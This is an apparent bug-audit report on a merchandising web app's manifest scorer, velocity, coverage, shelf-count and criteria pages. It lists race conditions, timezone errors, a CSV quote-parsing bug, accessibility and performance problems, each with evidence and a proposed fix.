#### merch-buying-13 — Window toggles and product search let older responses overwrite newer ones; Velocity/Coverage also store the error body as data

*medium · minor · bug · confidence high · `index.html:26884` · unverified*

**Evidence.** initMerchVelocity (26880-26890), initMerchCoverage (26977-26988) and prLoad (24534-24551) each fetch and render with no request token. vlSetWindow and cvSetWindow change vlWindow/cvWindow right away, and cvRender marks the toggle from `cvWindow` while the pill uses `d.window` (27000-27002). `vlData = await r.json();` runs before `if (!r.ok) throw` (26884-26885, and the same for cvData at 26982), so after a failed load vlData is `{error}` and the next Measure click runs vlRender and throws at `d.chain.orderCount` (26901).

**Failure scenario.** Velocity: click Quarter, then Week while Quarter is still loading. Week renders, Quarter's response arrives after it, and the Quarter table appears with 'Week' highlighted. Coverage: 28 then 7 leaves the 7-day toggle lit, a 28-day pill and 28-day cells. Products: typing 'cl' then 'clorox' can finish with results for 'cl' under a 'clorox' search box. After a failed Year load, every Measure button throws until another window loads.

**Proposed fix.** Add a sequence counter to each loader: `let vlSeq = 0; … const seq = ++vlSeq; const r = await fetch(...); const j = await r.json().catch(() => ({})); if (seq !== vlSeq) return; if (!r.ok) throw new Error(j.error || `HTTP ${r.status}`); vlData = j; vlRender();`. Do the same with cvSeq/cvData and prSeq in prLoad.

<a id="merch-buying-14"></a>
#### merch-buying-14 — Shelf Count: switching store or week quickly can put one store's counts in the form while Save writes them to another

*medium · minor · bug · confidence medium · `index.html:30425` · unverified*

**Evidence.** scLoad (30366-30380) has no token: `scData = await r.json(); … scRender();`. scRender fills the inputs with this week's or last week's values for whatever store the response is for. scSave reads the store and week from the selects at save time: `store: el('sc-store').value, week_ending: el('sc-week').value` (30425). Nothing ties the rendered rows to the request that produced them.

**Failure scenario.** A DM with two stores switches Coliseum to Dupont and the week in quick succession. Coliseum's response arrives last, so its prefilled counts show under 'Dupont', and pressing Save writes Coliseum's bays into Dupont's week. Dupont's shelf shares, and every Coverage and scorer figure built on them, are then wrong.

**Proposed fix.** `let scSeq = 0;` In scLoad: `const seq = ++scSeq; … const j = await r.json(); if (seq !== scSeq) return; scData = j;`. In scSave use the loaded identity: `store: scData.store, week_ending: scData.week_ending`, and refuse with a uiAlert if either differs from the selects.

<a id="merch-buying-15"></a>
#### merch-buying-15 — Manifests: the list and an open manifest can overwrite each other when one response arrives late

*medium · minor · bug · confidence high · `index.html:23186` · unverified*

**Evidence.** mfOpen (23180-23189) sets mfOpenId and then awaits `mfApi('manifest&id=…')`, which runs manifestBuild with its KV and D1 reads and can take seconds. mfList (23005-23046) sets `mfOpenId = null` and hides #mf-back. Neither checks, once its response lands, that it is still the latest request. mfRenderScore writes into #mf-view either way.

**Failure scenario.** An admin opens a large manifest and, while it shows 'Scoring…', clicks 'All manifests'. The list appears, then the manifest renders over it with no back button and mfOpenId=null. 'Categorise remaining' then sends id:null, 'Delete' does nothing, and 'Re-score' requests `id=null`.

**Proposed fix.** `let mfSeq = 0;` At the start of both mfList and mfOpen: `const seq = ++mfSeq;`. After each await: `if (seq !== mfSeq) return;` before rendering or calling mfSay.

<a id="merch-buying-16"></a>
#### merch-buying-16 — Shelf Count's default week is calculated in UTC, so on Sunday evening ET 'This week' jumps to the next week

*medium · minor · bug · confidence high · `index.html:30381` · unverified*

**Evidence.** index.html:30381-30390: `const d = new Date(); d.setUTCHours(12,0,0,0); d.setUTCDate(d.getUTCDate() + (7 - d.getUTCDay()) % 7);`. I ran the sliced scWeeks with the clock faked: at 2026-09-20 19:00 EDT (Sunday) This week = 2026-09-20, which is correct; at 20:30 EDT and 23:59 EDT on the same Sunday, This week = 2026-09-27, and the week that just closed drops to the second option.

**Failure scenario.** A store manager counts bays at close on Sunday, about 9pm ET, and presses Save on the default 'This week'. The count is filed under the following Sunday. The week that actually closed has no count, and when the next week's count is entered it replaces this one.

**Proposed fix.** Take today's date in ET: `const today = new Intl.DateTimeFormat('en-CA',{timeZone:'America/New_York'}).format(new Date()); const d = new Date(today + 'T12:00:00Z');` and keep the existing UTC arithmetic. The worker's merchWeekEnding already works on a date string, so no worker change is needed.

<a id="merch-buying-17"></a>
#### merch-buying-17 — Buy Criteria: leaving the page silently discards unpublished edits

*medium · minor · ui-ux · confidence high · `index.html:27130` · unverified*

**Evidence.** navigateToPage calls initMerchCriteria on every visit (index.html:12018-12020), and it starts with `mcDirty = new Map();` (27130) followed by a refetch. Edits are only kept client-side until Publish ('Held here rather than written on every keystroke', 27124-27127), and the status line counts them ('N unsaved changes — Publish… saves and publishes them').

**Failure scenario.** An admin changes six thresholds, jumps to Coverage to check a category, and comes back. The table has reloaded, the six edits are gone, and nothing warned them.

**Proposed fix.** At the top of initMerchCriteria: `if (mcData && mcDirty.size) { mcRender(); mcFillPicker(); return; }`, so pending edits survive navigation. A refresh after publish or discard already runs because those paths clear mcDirty first. Optionally add a `beforeunload` guard while mcDirty.size > 0.

<a id="merch-buying-20"></a>
#### merch-buying-20 — A decided manifest can be re-decided, which replaces its frozen record, and it still offers four actions the worker refuses

*medium · minor · bug · confidence high · `index.html:23327` · unverified*

**Evidence.** The action bar is always rendered: `Categorise remaining`, `Look up retail`, `Delete`, `Record decision` (23324-23327), plus the cost-basis Apply (23343). For a decided manifest the worker returns 409 on retail (22655), delete (22619) and costs (22708). manifest-classify has no status check (22453-22463), so it still rewrites a decided manifest's lines. manifest-decide has no status check either (22747-22777): it re-runs manifestBuild against today's criteria and overwrites `decision_snapshot`, `decided_by` and `decided_at`. That undoes the frozen-record design described at 22498-22505.

**Failure scenario.** On an approved manifest, someone clicks 'Record decision' to fix a typo in the note. The record of the figures it was approved on is replaced by today's re-score, and 'These are the figures it was approved on' now shows numbers nobody approved. Clicking Delete, Look up retail or Apply on the same page returns an error.

**Proposed fix.** Frontend: when `m.decided_at` is set, render only 'Re-score with today's data' / 'Show what was approved', hide Delete, Look up retail and Categorise, and make the cost inputs `disabled`. If re-deciding stays allowed, precede it with `uiConfirm('This replaces the record of what was approved on <date> with a fresh score against today\'s criteria.', {danger:true})`. A worker guard that refuses decide or classify when decided_at is set, unless the request says `redecide:true`, would add safety later.

<a id="merch-buying-24"></a>
#### merch-buying-24 — CSV parser: an unescaped inch mark in a description merges the rest of the file into one cell

*medium · minor · bug · confidence high · `worker.js:11206` · unverified*

**Evidence.** worker.js:11206 `if (ch === '"') { quoted = true; continue; }` treats a quote anywhere in a field as the start of a quoted field. I ran the real csvParse on `UPC,Description,Qty,Cost\n012345678905,Frying Pan 12" Nonstick,5,3.99\n012345678912,Cutting Board 18" x 12",10,2.50\n012345678929,Spatula,20,0.99`. It returned 2 rows: the header plus one row whose Description cell holds the rest of the file, commas and newlines included. Three lines became one. With an even number of stray quotes, pairs of lines merge instead and the count drops more quietly.

**Failure scenario.** A liquidator's system exports '12" skillet' without CSV quoting. The manifest loses lines (400 becomes 370), and totals, units and verdicts are computed on the survivors with no error shown.

**Proposed fix.** Open quoted mode only at the start of a field: `if (ch === '"' && field === "" ) { quoted = true; continue; }`, and otherwise append the quote as a literal (`field += ch`). RFC-quoted fields, including doubled quotes, parse exactly as before. Add the example above as an offline test.

<a id="merch-buying-26"></a>
#### merch-buying-26 — Manifest Scorer colour contrast fails: inline #6b6453 in dark mode, the 'vs std' green/amber in light mode, and the 'pass' badge in light mode

*medium · minor · accessibility · confidence high · `index.html:23304` · unverified*

**Evidence.** Measured against the composited backgrounds: inline `color:#6b6453` on mf-bar spans (23131, 23319, 23371, 23383) is 2.74:1 on op-panelHi #16203a in dark. The same inline colour on the pack-source and basis-name sub-lines in cells (23296, 23307) is 3.03:1 on op-panel. `<span style="color:${l.cost_vs_std <= 100 ? '#22c55e' : '#f59e0b'}">` (23304) is 2.28:1 and 2.15:1 on white in light. `.mf-pass{…color:#15803d}` (4546) is 4.31:1 on its green wash over white. An inline style cannot carry a `.dark` override (DESIGN.md §4.8), and the .mf-empty comment at 4518-4519 already fixed one of these.

**Failure scenario.** In dark mode the pack source, 'the level the call happens at', 'N rows' and the cost-basis guess note are dim grey on navy at under 3:1. In light mode every 'vs std' percentage is pale green or amber on white at about 2.2:1.

**Proposed fix.** Swap the inline styles for themed classes: use `class="mf-sub"` for the in-cell sub-lines (5.88 light / 5.21 dark). Add `.mf-hint{font-size:12px;color:#6b6453}.dark .mf-hint{color:rgb(var(--op-inkDim))}` for the bar notes. Add `.mf-good{color:#166534}.dark .mf-good{color:#22c55e}` (7.13 / 7.81) and `.mf-over{color:#92400e}.dark .mf-over{color:#f59e0b}` (7.09) for 'vs std'. Change `.mf-pass{color:#166534}`, which is 6.13:1 on its wash.

<a id="merch-buying-27"></a>
#### merch-buying-27 — Coverage red text and the CUT badge fail AA in both themes

*medium · minor · accessibility · confidence high · `index.html:4645` · unverified*

**Evidence.** `.cv-under{color:#ef4444}` (4645) has no theme split. On the Core total row's 11px `.cv-shelf` it is 3.60:1 on #fafaf6 (light) and 4.29:1 on op-panelHi (dark). DESIGN.md §4.8 says red text takes #c0392b in light and #f87171 in dark. `.cv-CUT{color:#fff;background:#ef4444}` (4655) is 3.76:1 for 9.5px bold, which the note at 4512-4514 already records as failing.

**Failure scenario.** The under-floor store figure on the totals row, the one flag the table exists to raise, reads below AA in both themes, and so does the CUT label on action rows.

**Proposed fix.** `.cv-under{color:#c0392b} .dark .cv-under{color:#f87171}` gives 5.20 and 5.83, and the 38px hero stays above 3:1 for large text. `.cv-CUT{color:#fff;background:#dc2626}` gives 4.83, matching .mf-g-used.

<a id="merch-buying-28"></a>
#### merch-buying-28 — The Manifest Scorer's tables don't follow DESIGN.md §4.8: no sticky first column, no legend, no level cue

*medium · minor · ui-ux · confidence high · `index.html:4538` · unverified*

**Evidence.** CLAUDE.md says the Scorer's tables 'are meant to look like Buy Criteria'. `.mf-tbl th.mf-l,.mf-tbl td.mf-l{text-align:left;white-space:normal;min-width:230px}` (4538) has no `position:sticky;left:0` and no opaque background (trap 2). The Lines table is 14 nowrap columns (23385-23387), wider than the 1500px container. Neither panel has a legend, yet cells use verdict badges (pass/warn/fail/unjudged), shelf flags, green/amber 'vs std' colouring, italic `.mf-ans` ('not at big box', 'under the floor') and '· applied'. §4.8 says 'every visual state the table uses gets a row in it.' The rollup is L2 and the lines are L3 with no .mc-lvl badge.

**Failure scenario.** Scrolling right to see Suggested or Days to clear on a 400-line manifest pushes the Item name off-screen, so it is unclear which product a verdict belongs to. A new buyer cannot tell what italic, amber or 'unjudged' means without reading the code.

**Proposed fix.** CSS: `.mf-tbl td.mf-l:first-child,.mf-tbl th.mf-l:first-child{position:sticky;left:0;z-index:2;background:#ffffff}`, `.dark … {background:rgb(var(--op-panel))}`, and the header cell `z-index:4;background:#fafaf6` / `.dark … rgb(var(--op-panelHi))`. Add a `<div class="mf-note">` legend under the Lines table with rows for pass/warn/fail/unjudged, 'vs std' colours, italic = a finding rather than a miss, and 'applied' = pack converted. Add `<span class="mc-lvl">L2</span>` to rollup category cells.

<a id="merch-buying-29"></a>
#### merch-buying-29 — A large manifest blocks the main thread for seconds, and it happens again after every action

*medium · minor · performance · confidence high · `index.html:23289` · unverified*

**Evidence.** mfRenderScore builds every line into one template and sets innerHTML (23289-23389). Every action (Apply, Categorise, Look up retail, decide) ends with mfOpen(), which refetches and re-renders. I timed the real mfRenderScore plus a forced layout in headless Chromium here: 331 lines 253 ms, 1,500 lines 939 ms, 5,000 lines (the upload cap) 4,258 ms at 70,014 cells. The response is also about 1.56 KB per line, roughly 7.8 MB of JSON per open at 5,000 lines.

**Failure scenario.** A buyer adds freight on a 3,000-line manifest and clicks Apply. The tab freezes for 2-3 s on desktop and much longer on an iPad, and it freezes again after 'Categorise remaining'.

**Proposed fix.** Frontend: render the first 300 lines, then a 'Show all N lines' button that renders the rest in 500-row chunks via requestAnimationFrame. Add filter chips (warn / fail / unjudged / no retail) above the Lines table so the lines worth reading are one click away. Keep the rollup and KPIs rendered from s.* as they are. Server-side line paging would be a later, major change.

<a id="merch-buying-30"></a>
#### merch-buying-30 — The mapping screen can't show whether the chosen mapping is right: the sample has only the first 4 columns and the header diagnostics are dropped

*medium · minor · ui-ux · confidence high · `index.html:23142` · unverified*

**Evidence.** index.html:23142 `First five rows: ${(j.sample || []).slice(0,5).map(r => mfEsc(r.slice(0,4).join(' · '))).join(' <br> ')}` shows columns A-D only, whatever is mapped, and does not update when a select changes. The upload response includes `header_row`, `header_skipped`, `header_score`, `skipped_subtotals` and `skipped_repeat_headers`, commented 'The page shows these' (worker.js:22338-22345), but index.html never reads them. The comment at 23096-23098 calls this 'the one cheap moment to catch' a wrong column.

**Failure scenario.** The cost column is H. The buyer maps Cost to 'Ext Price' by mistake and the sample shows nothing from G or H, so nothing looks wrong. A letterhead that skipped 6 rows, or a header matched on one field, is never mentioned.

**Proposed fix.** Render the sample as a small `.mf-tbl` whose columns are the currently mapped fields (Description, Qty, Cost, …), with header cells named after the mapped header, and re-render it from each select's onchange. Add a line above it: `Header found on row ${j.header_row}${j.header_skipped ? ` — ${j.header_skipped} rows above it skipped` : ''}; ${j.skipped_subtotals} subtotal rows left out.`, and flag `header_score < 3` in amber.

<a id="merch-buying-31"></a>
#### merch-buying-31 — Keyboard and screen-reader gaps: clickable rows and cells can't be focused, table inputs have no labels, toggles have no pressed state

*medium · minor · accessibility · confidence high · `index.html:24567` · unverified*

**Evidence.** Opening a manifest is a `<tr onclick="mfOpen(…)">` (23013). Editing a product is `<div class="pr-row" onclick="prEdit(${i})">` (24567). Expanding a velocity L2 is `<td … onclick="vlToggle(…)">` (26925-26926). None has tabindex, role or a key handler, so a keyboard cannot reach them. Criteria cells are `<input type="text">` / `<input type="checkbox">` with no aria-label (27253, 27262), so a screen reader hears 'edit text' ×100. The Products editor's `<label>Product</label><input id="pr-e-title">` has no `for` (24603-24615). The 7/28-day and Window/Measure toggles (4678-4679, 26941-26945) have no aria-pressed. The Shelf Count selects (5575-5576) have no label.

**Failure scenario.** A keyboard-only admin cannot open a manifest, edit a product or expand a velocity category. A VoiceOver user in Buy Criteria cannot tell which category or threshold the focused box is.

**Proposed fix.** Use real buttons: put a `<button class="mf-open">` inside the vendor cell, make the product row a `<button type="button" class="pr-row">` (reset its styles), and render the velocity twist as a `<button aria-expanded="${open}">`. Add `aria-label="${label} — ${colLabel}"` to each criteria input. Add `for="pr-e-…"` to the editor labels, `aria-pressed` to the segment buttons, and `aria-label="Store"` / `"Week"` to the Shelf Count selects.

<a id="merch-buying-12"></a>
#### merch-buying-12 — Velocity's 'Year' window reads 1,820 KV snapshots per request, well past the ~1,000-per-invocation ceiling the repo designs around elsewhere

*medium · major · performance · confidence medium · `worker.js:26330` · unverified*

**Evidence.** worker.js:26299 allows `ALLOWED = [7, 28, 91, 364]`. Then 26328-26331 run `for (const store of merchStores()) { … dates.map(d => env.SALES_SNAPSHOTS.get(`items:${lc}:${d}`, "json")) }`, which is 364 dates × 5 open stores = 1,820 KV gets plus a full shelf_counts scan, all in one invocation. The repo's own limits say WRS caps at '120 days x 7 stores ~= 840 KV, a safe margin under 1000' (worker.js:44-53), and CATEGORY_SERIES_MAX_STORE_DAYS = 840 is REFUSED above that. Nothing here caps it. The page offers `[364, 'Year']` (index.html:26878).

**Failure scenario.** An admin clicks 'Year'. The request goes past the subrequest/KV ceiling and returns 500, and the page shows 'Could not load velocity: …' while the old table stays up. Even under a higher ceiling it is 1,820 KV round trips on each click.

**Plan.** Future plan. (1) Stopgap, frontend-only and safe with any worker: remove `[364,'Year']` from VL_WINDOWS. (2) Worker: serve windows over ~120 days from per-store weekly aggregates. The weekly summaries writeWeekSummary already builds, or a small D1 table of units and baskets per store/week/L3 filled by the nightly cron, would do; 52 reads per store instead of 364. Keep the response shape identical so no frontend change is needed. Deploy the worker first, since the frontend only gains a window, and put Year back after the worker is verified. Risk: weekly basket counts cannot be summed across L3s (the l2Orders note at 14016-14019 applies), so store l2Orders as their own column. Verify with an offline test that counts env.SALES_SNAPSHOTS.get calls per window and asserts ≤ 840.

<a id="merch-buying-23"></a>
#### merch-buying-23 — Remapping a PDF sends it through Claude again, so the rows stored can differ from the rows the user confirmed

*medium · major · bug · confidence high · `worker.js:22392` · unverified*

**Evidence.** mfConfirmMap posts `...mfFile` ({format:'pdf', file_b64}) to manifest-remap (index.html:23157). The handler calls `rows = await manifestRows(env, body)` (worker.js:22392), which for a PDF is pdfRows, a new billed Messages call (11591-11631). The comment at 11658-11660 promises a file 'cannot parse differently on the way back through', but a model reading is not deterministic: headers or rows can differ, after which `manifestMissing(map, headers)` rejects the confirmed map ('Still unmapped'), or optional mapped columns quietly resolve to -1. The mapping screen's sample came from the first read.

**Failure scenario.** A salvage vendor's PDF is read at upload ($, read #1) and the buyer confirms the mapping against those headers. Remap reads it again ($, read #2) and gets 'Unit Cost' where read #1 had 'Unit cost', so the remap fails; or it drops a continuation row, and the manifest is scored on a different set of lines than the buyer checked.

**Plan.** Future plan. Worker: on a PDF upload, store the parsed rows under a short-lived key (for example KV `manifest-rows:<id>` with a 24h TTL, deleted after a successful remap), and in manifest-remap use them when `format==='pdf'` and the key exists, falling back to re-reading otherwise. The frontend needs no change and keeps sending the file. Deploy the worker only; the change is backward-compatible because old clients still send file_b64. Risk: it briefly stores vendor pricing, which the code avoids today, so keep the TTL and delete on confirm. Verify on staging by uploading a PDF, remapping twice, confirming one Anthropic call in the logs, and checking the header lists are identical.

<a id="merch-buying-25"></a>
#### merch-buying-25 — The decision snapshot exceeds D1's ~2 MB value limit at around 1,250 lines, so large manifests cannot be decided

*medium · major · bug · confidence medium · `worker.js:22766` · unverified*

**Evidence.** worker.js:22766-22777 writes `decision_snapshot = JSON.stringify({ …, score: built.score, lines: built.lines })` into a single column. Each built line carries every manifest_lines column plus about 20 derived fields, and score.lines adds tests with notes. Using a realistic line (description, retail_url, flags) and its perLine entry, the size comes to 331 lines = 0.52 MB, 1,000 = 1.56 MB, 1,500 = 2.34 MB, 5,000 = 7.81 MB. Upload allows up to 5,000 lines (22225). D1's maximum string/row size is 2,000,000 bytes.

**Failure scenario.** A 2,000-line Alliance load is scored and approved. 'Record decision' fails with 'Could not record: string or blob too big', and the call can never be recorded.

**Plan.** Future plan, worker-only but a stored-format change. (1) Update the read path first to accept either the current JSON or `{z:'gzip-b64', data}` (CompressionStream('gzip') + base64), or a pointer to an R2 object `manifest-snapshots/<id>.json`. (2) Then switch the write path to compress, or to R2 above 1.5 MB. Read must ship before write because the new format is not readable by old code. Also trim fields the frozen view never reads (manifest_id, retail_url, raw columns) from each line. Verify on staging by deciding a synthetic 5,000-line manifest and reopening it frozen.

<a id="merch-buying-35"></a>
#### merch-buying-35 — A wrong category or price on a manifest line can't be fixed from the Scorer, and Products edits don't reach lines already written

*medium · major · ui-ux · confidence medium · `worker.js:22549` · unverified*

**Evidence.** The worker has `manifest-line { id, line_id, l3?, suggested_price? }`, 'A human correction … persists to item_cache' (22546-22588), but index.html never calls it (grep for manifest-line returns nothing). The Lines table's Category and Suggested cells are read-only (23294, 23308-23310). Products says 'a correction here fixes both' (5118-5119), but manifestBuild reads l3 from manifest_lines, and item_cache overrides are only applied when lines are written (manifestWriteLines' item_cache read, 12045) or re-priced (10962). 'Categorise remaining' only touches `l3 IS NULL` lines (22460).

**Failure scenario.** A line of phone chargers is classified as 'Consumable Food', so it is scored against food criteria and food ASP. The buyer can't fix it from the manifest. Fixing it in Products changes nothing on this manifest, which keeps its wrong verdict until the file is remapped.

**Plan.** Future plan, frontend-only because the endpoint already exists. Make the Category cell a button that opens an inline select of L3s (reuse the prState.cats tree from merch-products, or merchTree), and add an inline 'Suggested' price edit. POST to manifest-line and then call mfOpen(id). Disable both when m.decided_at is set. Change the Products copy to 'fixes future manifests and the next remap'. Verify: correct one line's category, check that the rollup moves it and the verdict re-scores, then confirm a new upload of the same UPC picks up the manual category.

<a id="merch-buying-18"></a>
#### merch-buying-18 — Removing an override that was added but never saved queues 10 phantom changes, and publishing them creates a version that changes nothing

*low · minor · bug · confidence high · `index.html:27206` · unverified*

**Evidence.** mcRemoveOverride (27197-27211) always runs `for (const [f] of MC_COLS) mcDirty.set(mcKey(key, f), '');`, including for a row that exists only in mcPending (added locally, never on the server). The status then reads '10 unsaved changes', Publish appears, and publishing sends ten deletes that match no rows through merchEnsureDraft, which copies the live version and publishes a new version with identical content.

**Failure scenario.** An admin adds 'Coffee & Tea' by mistake and removes it again. The page says 10 unsaved changes. Following the prompt, they publish with a note, and the version history gains a version that changed nothing.

**Proposed fix.** `if (mcPending.includes(key)) { for (const [f] of MC_COLS) mcDirty.delete(mcKey(key, f)); } else { for (const [f] of MC_COLS) mcDirty.set(mcKey(key, f), ''); }`

<a id="merch-buying-19"></a>
#### merch-buying-19 — The Chain default Core checkbox always shows unchecked, and the Core column has none of the three cell states

*low · minor · bug · confidence high · `index.html:27252` · unverified*

**Evidence.** mcRows builds the chain row as `{ key: null, level: 'chain', label: 'Chain default', fields: mcData.defaults || {} }` with no `core` (27151). inputFor then computes `const on = mcDirty.has(k) ? raw === '1' : !!row.core;` (27252), which is always false for the chain row. The worker treats chain core='1' as core for every L2 (`coreOf(own, chain)`, 14079). The checkbox's only class is 'mc-dirty', and a native checkbox ignores the background and border that class sets, so inherited, set-here and changed-in-draft all look the same (§4.8 'the three cell states').

**Failure scenario.** Someone ticks Core on Chain default and publishes. Every L2 becomes core, the shelf-count form asks for all ten, and Coverage reads 'core' as almost the whole floor. After a reload the Chain default box shows unchecked, so the cause is invisible.

**Proposed fix.** Add `core: mcData.defaults?.core?.value === '1'` to the chain row, or render no checkbox on the chain row since chain-wide core is meaningless. Wrap each checkbox in `<span class="mc-ck ${cls}">` with the same inherit/override/dirty border and background rules the text inputs use.

<a id="merch-buying-21"></a>
#### merch-buying-21 — 'Record decision' asks the buyer to type an enum value into a free-text prompt

*low · minor · ui-ux · confidence high · `index.html:23495` · unverified*

**Evidence.** index.html:23495 `const status = await uiPrompt('Record decision', 'approved, approved_edits or passed');`, followed by a string check and `uiAlert('Use one of: approved, approved_edits, passed.')`. The app already has `uiChoose(title, message, choices)` (7837), used for this kind of choice at 30244.

**Failure scenario.** The buyer types 'Approved', 'approve' or 'approved with edits' (or the phone auto-capitalises it), gets rejected, and has to start over.

**Proposed fix.** `const status = await uiChoose('Record decision', 'What was the call?', [{label:'Approve', value:'approved'},{label:'Approve with edits', value:'approved_edits'},{label:'Pass', value:'passed'}]); if (!status) return;` Keep the 'Why' uiPrompt.

<a id="merch-buying-22"></a>
#### merch-buying-22 — Admins are shown Delete and Look up retail, but the worker only allows superusers to run them

*low · minor · bug · confidence high · `index.html:23325` · unverified*

**Evidence.** The page opens for superuser and admin (adminOnly, 11839-11853), and the list row × (23019-23022), `Look up retail` (23325) and `Delete` (23326) render for both. manifest-delete calls `requireAdminAccess(request, currentUser, isAdminSecret, corsJson)` without allowAdminMutation (22602), and manifest-retail does the same (22643), so a POST from an admin returns 403 NEED_SUPERUSER (5215-5224).

**Failure scenario.** An admin confirms 'Delete "Clorox" and its 412 lines?' and gets 'Could not delete: Forbidden'. 'Look up retail' fails with 'Lookup failed: Forbidden' after its confirm.

**Proposed fix.** Only render the × and Delete buttons, and Look up retail, when `currentUser?.role === 'superuser'`. Alternatively, if admins are meant to have them, change the worker gate deliberately; that is a policy call, not a UI fix.

<a id="merch-buying-32"></a>
#### merch-buying-32 — The phone surfaces zoom on focus in iOS (inputs under 16px) and have small tap targets

*low · minor · ui-ux · confidence high · `index.html:5093` · unverified*

**Evidence.** Products calls itself 'a phone surface' (24582-24584), yet `#pr-q{…font-size:15px}` (5067-5068) and `.pr-fld input,.pr-fld select{…font-size:15px}` (5093-5094) are below 16px, so iOS Safari zooms on focus. Shelf Count, 'entered on a phone by the store manager' (5566-5568), uses `text-sm` (14px) on both selects (5575-5576). Tap targets: `.pr-tab` is about 31px tall (7px padding + 12px text, 5060-5061), `.mf-x` about 25×21px (4561-4562), and the vl/cv segment buttons about 29px.

**Failure scenario.** A manager taps the week picker on an iPhone and the page zooms in. Every Products edit zooms too, and they have to pinch back out before Save.

**Proposed fix.** Set 16px on `#pr-q` and `.pr-fld input,.pr-fld select`, and change the Shelf Count selects from `text-sm` to `text-base`. Give `.pr-tab` `min-height:40px` and `.mf-x` `min-width:36px;min-height:36px`.

<a id="merch-buying-33"></a>
#### merch-buying-33 — §4.8 trap 4 again: the 'Only overrides' checkbox and the manifest file picker render as white UA controls in dark mode

*low · minor · ui-ux · confidence high · `index.html:5546` · unverified*

**Evidence.** The color-scheme fix is scoped to the table: `.dark #mc-tbl input[type=checkbox]{color-scheme:dark}` (5280). `#mc-only-overrides` sits in `#mc-bar` (5546), outside the table. `<input id="mf-file" type="file" class="mf-in">` (23031) has the same UA-drawn button that Opportunity Buys fixed with `.dark #page-opportunity-buys input[type=file]{color-scheme:dark}` (3703-3708). The Manifests page has no such rule.

**Failure scenario.** In dark mode the Buy Criteria bar shows a bright white checkbox, and the Manifests upload shows a white 'Choose File' slab on the navy panel.

**Proposed fix.** Change the selector to `.dark #mc-panel input[type=checkbox]{color-scheme:dark}` and add `.dark .mf-panel input[type=file],.dark .mf-panel select{color-scheme:dark}`.

<a id="merch-buying-34"></a>
#### merch-buying-34 — Coverage and Velocity §4.8 gaps: duplicate ids, incomplete legends, no hierarchy badges, store codes vs names

*low · minor · ui-ux · confidence high · `index.html:27097` · unverified*

**Evidence.** cvRenderTable emits `<div id="cv-panel"><div id="cv-bar">` (27097-27098) while the static markup already has `#cv-panel`/`#cv-bar` (4674-4675), giving duplicate ids. The Coverage legend (27101-27106) leaves out untinted 'balanced', the red `.cv-under` store-under-floor text, and '—'. The Velocity legend (26963-26968) does not explain untinted cells. Velocity child rows only indent (`padding-left:30px`, 5167), with no `.mc-lvl` L2/L3 badge and no connector (§4.8 'Hierarchy in a table'). Velocity headers show `st.store` codes (26959, 'BL14') where Coverage shows names. The sticky column has `min-width:230px`/`210px` (5163, 4626), which is about 60% of a 361px phone panel.

**Failure scenario.** A reader sees red numbers in the Core total row with nothing explaining them. In Velocity, expanded L3 rows are hard to tell from L2s, and 'BL14' means nothing to someone who knows the stores by name.

**Proposed fix.** Rename the rendered ids to `cv-tpanel`/`cv-tbar` and apply the same rules through a shared class. Add legend entries: `<span>no tint — within 0.75–1.25×</span>`, `<span class="cv-under">54%</span> store under the 60% floor`, `— no sales in window`. Prefix Velocity cells with `<span class="mc-lvl">L2</span>`/`L3` and copy the `::before` connector from `#mc-tbl tr.mc-l3`. Use `st.label` in Velocity headers. Add `@media(max-width:640px){#vl-tbl td.vl-cat,#cv-tbl td.cv-cat{min-width:140px}}`.

<a id="merch-buying-36"></a>
#### merch-buying-36 — Manifest inputs: a stale file can be re-uploaded, 'Read file' works before the read finishes, and cost fields silently drop the minus sign

*low · minor · bug · confidence high · `index.html:23050` · unverified*

**Evidence.** `mfFile` is set only in the FileReader onload (23058-23076) and is never cleared, including by mfList (23005-23006). The 'Read file' button is enabled throughout and just checks `if (!mfFile)` (23086). There is no client-side size check, although the worker caps .xlsx at 8 MB base64 and PDF at 20 MB (11661, 11590). mfSaveCosts parses with `Number(String(v).replace(/[^0-9.]/g, '')) || 0` (23261), so '-5' becomes 5 and '1.2.3' becomes 0, both without warning.

**Failure scenario.** After finishing vendor A, the buyer returns to the list, types vendor B, forgets to pick a file and clicks 'Read file'. A's file is uploaded as B. Or: they pick a 5 MB workbook and click immediately, so the previous file goes up. Or: they type freight '1.500,00' and it is saved as 0.

**Proposed fix.** Set `mfFile = null` in mfList and at the start of mfPick. Disable the Read file button until onload finishes. Refuse `f.size > 6e6` (xlsx) or `> 15e6` (pdf) in mfPick with a clear message. In mfSaveCosts, reject values that don't match `/^\s*\$?[\d,]*\.?\d+\s*%?\s*$/` with uiAlert instead of coercing them to 0.

<a id="merch-buying-37"></a>
#### merch-buying-37 — Products: the list stops at 200 with no indication, and it is loaded only once per session

*low · minor · ui-ux · confidence high · `index.html:24512` · unverified*

**Evidence.** `initMerchProducts(){ if (prState.loaded) return; …}` (24511-24515) means coming back to the page never refreshes, so items priced on Price Scan since then are missing. prLoad requests `limit=200` (24538), and the worker returns `counts` but the page never compares them with rows.length, so there is no 'showing 200 of 1,340' and no way to page (the worker supports `offset`, 23140). prLoad also calls `await r.json()` before checking r.ok (24540), so a non-JSON 5xx shows as 'Unexpected token <'.

**Failure scenario.** An admin looking for an older scanned item scrolls to the bottom of 200 rows, doesn't find it, and concludes it was never scanned.

**Proposed fix.** Always call prLoad() in initMerchProducts (it is cheap), or refresh when the page becomes visible. After rendering, if `prState.rows.length < (j.counts[prState.tab]||0)`, append `<button class="pr-more">Show more (${shown} of ${total})</button>` that loads with `offset=rows.length` and appends. Use `r.json().catch(() => ({}))`.

<a id="merch-buying-38"></a>
#### merch-buying-38 — Manifest list dates and change-log dates are UTC, so evening uploads show tomorrow's date

*low · minor · bug · confidence high · `index.html:23015` · unverified*

**Evidence.** `${mfEsc((m.uploaded_at || '').slice(0,10))}` (23015) and `${esc((first.published_at || '').slice(0, 10))}` (27365) cut the date out of `new Date().toISOString()` values (worker.js:22284, 22095), which are UTC.

**Failure scenario.** A manifest uploaded at 9 pm ET on Sep 22 is listed as uploaded 2026-09-23. A criteria version published Sunday evening appears in the log under Monday.

**Proposed fix.** Format in ET: `const etDay = iso => iso ? new Date(iso).toLocaleDateString('en-CA', { timeZone: 'America/New_York' }) : '';` and use it at both sites.

<a id="merch-buying-39"></a>
#### merch-buying-39 — Shelf Count: numbers carried over from last week look exactly like numbers entered this week

*low · minor · ui-ux · confidence high · `index.html:30401` · unverified*

**Evidence.** `const value = now != null ? now : (prev != null ? prev : '');` (30401) puts last week's bays into the same plain input as a real entry, and the only distinction is the small 'Last week: N' under the label. §4.8 says any surface where 'a value can come from somewhere else needs all three [states], and needs the legend' (inherited / set here / changed).

